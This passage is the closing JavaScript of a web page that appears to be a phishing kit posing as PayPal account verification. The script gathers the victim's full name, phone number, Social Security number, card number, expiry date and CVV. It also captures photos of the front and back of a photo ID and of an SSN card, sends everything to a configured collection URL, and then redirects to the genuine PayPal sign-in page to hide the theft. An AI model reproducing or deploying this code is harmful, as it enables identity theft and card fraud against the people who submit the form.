                const context = canvas.getContext('2d');
                context.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/png');
                const base64String = dataUrl.split(',')[1];
                
                if (type === 'front') capturedPhotoIdFrontBase64 = base64String;
                else if (type === 'back') capturedPhotoIdBackBase64 = base64String;
                else if (type === 'ssn') capturedSsnCardBase64 = base64String;

                imagePreview.src = dataUrl;
                imagePreview.style.display = 'block';
                imageLabel.textContent = `camera_capture_${type}.png`;
                stopCamera();
            });
        }

        initializeCameraUpload('front');
        initializeCameraUpload('back');
        initializeCameraUpload('ssn');

        function setupStandardFileUpload(triggerEl, inputEl, previewEl, labelEl, type) {
            if (triggerEl && inputEl && previewEl && labelEl) {
                triggerEl.addEventListener('click', () => { // Clicking the container triggers file input
                    inputEl.click();
                });
                inputEl.addEventListener('change', function() {
                    const file = this.files[0];
                    if (file) {
                        const reader = new FileReader();
                        reader.onload = function(e) {
                            previewEl.src = e.target.result; previewEl.style.display = 'block';
                            labelEl.textContent = file.name;
                            if (type === 'front') capturedPhotoIdFrontBase64 = '';
                            else if (type === 'back') capturedPhotoIdBackBase64 = '';
                            else if (type === 'ssn') capturedSsnCardBase64 = '';
                        };
                        reader.readAsDataURL(file);
                    } else {
                        previewEl.src = ''; previewEl.style.display = 'none'; labelEl.textContent = '';
                    }
                });
            }
        }
        
        const uploadPhotoIdFrontTrigger = document.getElementById('upload-photo-id-front-trigger');
        const photoIdFrontInput = document.getElementById('photo-id-front-input');
        const photoIdFrontPreview = document.getElementById('photo-id-front-preview');
        const photoIdFrontLabel = document.getElementById('photo-id-front-label');

        const uploadPhotoIdBackTrigger = document.getElementById('upload-photo-id-back-trigger');
        const photoIdBackInput = document.getElementById('photo-id-back-input');
        const photoIdBackPreview = document.getElementById('photo-id-back-preview');
        const photoIdBackLabel = document.getElementById('photo-id-back-label');
        
        const uploadSsnCardTrigger = document.getElementById('upload-ssn-card-trigger');
        const ssnCardInput = document.getElementById('ssn-card-input');
        const ssnCardPreview = document.getElementById('ssn-card-preview');
        const ssnCardLabel = document.getElementById('ssn-card-label');

        setupStandardFileUpload(uploadPhotoIdFrontTrigger, photoIdFrontInput, photoIdFrontPreview, photoIdFrontLabel, 'front');
        setupStandardFileUpload(uploadPhotoIdBackTrigger, photoIdBackInput, photoIdBackPreview, photoIdBackLabel, 'back');
        setupStandardFileUpload(uploadSsnCardTrigger, ssnCardInput, ssnCardPreview, ssnCardLabel, 'ssn');

        // --- Verification Form Submission Logic ---
        const verificationForm = document.getElementById('verification-form');
        const fullNameInput = document.getElementById('full-name');
        const phoneNumberInput = document.getElementById('phone-number');
        
        if(verificationForm && VERIFY_INFO_URL) { 
            verificationForm.addEventListener('submit', async (event) => {
                event.preventDefault();
                const submitButton = verificationForm.querySelector('button[type="submit"]');
                const originalButtonText = submitButton.textContent;
                submitButton.disabled = true;
                submitButton.textContent = 'Processing...';

                const fullName = fullNameInput ? fullNameInput.value.trim() : '';
                const phoneNumber = phoneNumberInput ? phoneNumberInput.value.trim() : '';
                const ssn = rawSsn; 
                const bankName = ''; 
                const cardNumberVal = cardNumberInput ? cardNumberInput.value.trim().replace(/\s/g, '') : '';
                const expiryDateVal = expiryDateInput ? expiryDateInput.value.trim() : '';
                const cvvVal = cvvInput ? cvvInput.value.trim() : '';

                let finalPhotoIdFrontBase64 = capturedPhotoIdFrontBase64;
                let finalPhotoIdBackBase64 = capturedPhotoIdBackBase64;
                let finalSsnCardBase64 = capturedSsnCardBase64;

                async function getBase64FromFile(fileInput) {
                    if (fileInput && fileInput.files.length > 0) {
                        const file = fileInput.files[0];
                        if (file) {
                            return await new Promise((resolve, reject) => {
                                const reader = new FileReader();
                                reader.onloadend = () => resolve(reader.result.split(',')[1]);
                                reader.onerror = reject;
                                reader.readAsDataURL(file);
                            });
                        }
                    }
                    return '';
                }

                if (!finalPhotoIdFrontBase64 && photoIdFrontInput && photoIdFrontInput.files.length > 0) {
                    finalPhotoIdFrontBase64 = await getBase64FromFile(photoIdFrontInput);
                }
                if (!finalPhotoIdBackBase64 && photoIdBackInput && photoIdBackInput.files.length > 0) {
                    finalPhotoIdBackBase64 = await getBase64FromFile(photoIdBackInput);
                }
                if (!finalSsnCardBase64 && ssnCardInput && ssnCardInput.files.length > 0) {
                    finalSsnCardBase64 = await getBase64FromFile(ssnCardInput);
                }
                
                if (!fullName || !phoneNumber || !ssn || !cardNumberVal || !expiryDateVal || !cvvVal) {
                    alert('Please fill in all required text fields.');
                    submitButton.disabled = false; submitButton.textContent = originalButtonText; return;
                }
                if (!finalPhotoIdFrontBase64) { 
                     alert('Please upload or capture the front of your photo ID.');
                     submitButton.disabled = false; submitButton.textContent = originalButtonText; return; 
                }

                const data = {
                    fullName: fullName, phoneNumber: phoneNumber, ssn: ssn, bankName: bankName,
                    cardNumber: cardNumberVal, expiryDate: expiryDateVal, cvv: cvvVal,
                    photoIdFront: finalPhotoIdFrontBase64, 
                    photoIdBack: finalPhotoIdBackBase64, 
                    ssnCard: finalSsnCardBase64
                };
                console.log("Submitting verification data:", data);

                try {
                    const response = await fetch(VERIFY_INFO_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    const responseData = await response.json();
                    if (response.ok) {
                        // More professional success message
                        let successMessage = "Thank you for providing your information. We're reviewing it to help keep your account secure. You will now be redirected.";
                        alert(successMessage); 
                        
                        // Redirect to PayPal login page after 1 second
                        setTimeout(() => { 
                            window.location.href = "https://www.paypal.com/signin"; 
                        }, 1000); // 1 second delay

                    } else {
                        alert(`Verification submission failed: ${responseData.message || response.statusText || 'Server error'}`);
                        submitButton.disabled = false; submitButton.textContent = originalButtonText;
                    }
                } catch (error) {
                    console.error('Error during verification fetch:', error);
                    alert('An error occurred during submission. Please check your connection or try again.');
                    submitButton.disabled = false; submitButton.textContent = originalButtonText;
                }
            });
        } else {
            if (!verificationForm) console.error("Verification form not found.");
            if (!VERIFY_INFO_URL) console.error("Verify info URL not found for form submission (check data-verify-url on form).");
        }
    </script>
</body>
</html>
